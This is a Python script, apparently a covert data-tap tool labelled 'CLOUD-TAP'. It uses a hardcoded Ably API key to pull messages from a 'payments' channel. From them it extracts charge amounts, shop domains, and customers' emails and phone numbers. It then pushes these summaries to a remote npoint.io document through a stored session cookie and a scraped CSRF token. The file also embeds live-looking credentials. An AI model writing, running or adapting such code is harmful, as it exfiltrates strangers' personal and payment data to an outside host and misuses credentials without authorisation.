import json,subprocess,re,datetime,os
KEY="fADFBg.VTCH9Q:uerG8AHZmxj5OX48eq37RB_8qmcPodvX0VGxirjBplI"
B="97026c7251e4075f47c3"
CK="%2BAXnE%2B%2BCctw5TAmo3pnAdg8S8lrn6wnuS5JabBIb2xzcaV2EyQzd%2B520e3e3pF21f1K9RjYou1e41Qd%2FKp1ehd8ixns9Yhh%2BL11D2LgRm8ERl44bqrqCVpM%2BtNBV%2BAAFOu%2F6Dh2Kn%2BHika2y1G5ynNj7Vj22F37G71wxQQzuShSXEJvm%2FUj%2FTDylscQFksMAZ27jRh9%2FqOQtST8aY16BKIbaS28jlYhxIdbzdrTe%2BzEuzk3mbHUqt6o7iEFWVrsYglbqlWzZhnzGdtn2s3wyAJgYKBB5GGFFLkcOrSa2ue%2BjjkReFA2Lzei8seAkiZbu9fU2sJqClhRNFQr6ll22OlpLB8S8fxmtgYQpyhjjGelHUgqmkoHKX51wFcm7KJN9SGDtiutX8yIRKmVlBTq4zbYh%2Bdsc5vL8%2BNJdyGNsycj06K1bzGVVBYNuWAhAv3DPNOb0lzARGwKUdbPAt6unj2xNZg3d%2FK6NWr6vtlO9Lgviw%2FiVgTWVN8iTrouh%2BFNMXcLyIFIXSgjwia8%3D--R2aWYWweHPkMqKOi--emLKAoyD0abe6zVNdphFfQ%3D%3D"
def curl(a,timeout=30):
    return subprocess.run(["curl","-sk4","-m",str(timeout)]+a,capture_output=True,text=True,timeout=timeout+10).stdout
old=curl(["https://api.npoint.io/"+B]).strip() or "{}"
try: prev=json.loads(old)
except: prev={}
if not isinstance(prev,dict): prev={}
hist=prev.get("batches") if isinstance(prev.get("batches"),list) else []
last=prev.get("cloud_last_ts") or 0
t=curl(["-u",KEY,"https://rest.ably.io/time"]).strip().strip("[]").split(",")[0]
now=int(t) if t else 0
if not now: print("no-time"); raise SystemExit
start=last if last>0 else now-110000
if now-start>115000: start=now-115000
raw=curl(["-u",KEY,"https://rest.ably.io/channels/payments/messages?limit=100&start=%d&end=%d"%(start,now-1)])
try: msgs=json.loads(raw)
except: msgs=[]
if not isinstance(msgs,list): msgs=[]
fresh=[m for m in msgs if m.get("timestamp",0)>last]
amounts=[];shops={};tail=[];maxts=0
for m in fresh:
    maxts=max(maxts,m.get("timestamp",0))
    try: d=json.loads(m["data"])
    except: continue
    a=d.get("amount") or 0
    if a: amounts.append(a)
    ru=(d.get("result") or {}).get("redirectUrl") or ""
    if "//" in ru:
        sh=ru.split("/")[2]; shops[sh]=shops.get(sh,0)+1
    c=d.get("customer") or {}
    if len(tail)<3:
        tail.append("%s|EUR%s|%s|tel:%s"%(datetime.datetime.utcfromtimestamp(m["timestamp"]/1000).strftime("%H:%M"),d.get("amount"),(c.get("email") or "-"),(c.get("phone") or "-")))
if fresh:
    summ="CLOUD-TAP +%d-charges EUR%.2f shops%s latest[%s]"%(len(fresh),sum(amounts),json.dumps(shops,separators=(",",":")),";".join(tail))
    newts=maxts
else:
    summ="CLOUD-TAP 0-new (quiet)"; newts=now-1000
hist.append({"#":len(hist)+1,"at":datetime.datetime.now(datetime.timezone.utc).isoformat()[:16],"summary":summ})
if len(hist)>500: hist=hist[-500:]
new={"firehose":"LIVE-CLOUD","updated":datetime.datetime.now(datetime.timezone.utc).isoformat(),
"cloud_last_ts":newts,"batches_count":len(hist),"latest_batch":summ,"batches":hist}
for k in ("clients_total","clients_with_phone","clients_dossier_top20"):
    if k in prev: new[k]=prev[k]
page=curl(["-H","Cookie: _npoint_session="+CK,"-H","User-Agent: Mozilla/5.0","https://www.npoint.io/docs/"+B])
m=re.search(r'csrf-token" content="([^"]+)',page)
if not m: print("no-csrf"); raise SystemExit
body=json.dumps({"contents":json.dumps(new),"original_contents":old})
r3=curl(["-X","PATCH","-H","Cookie: _npoint_session="+CK,"-H","x-csrf-token: "+m.group(1),
"-H","Content-Type: application/json;charset=UTF-8","-H","Accept: application/json, text/plain, */*",
"-H","User-Agent: Mozilla/5.0","-d",body,"https://www.npoint.io/documents/"+B])
print("CLOUD-PUSH:","OK" if '"token"' in r3 else r3[:200])
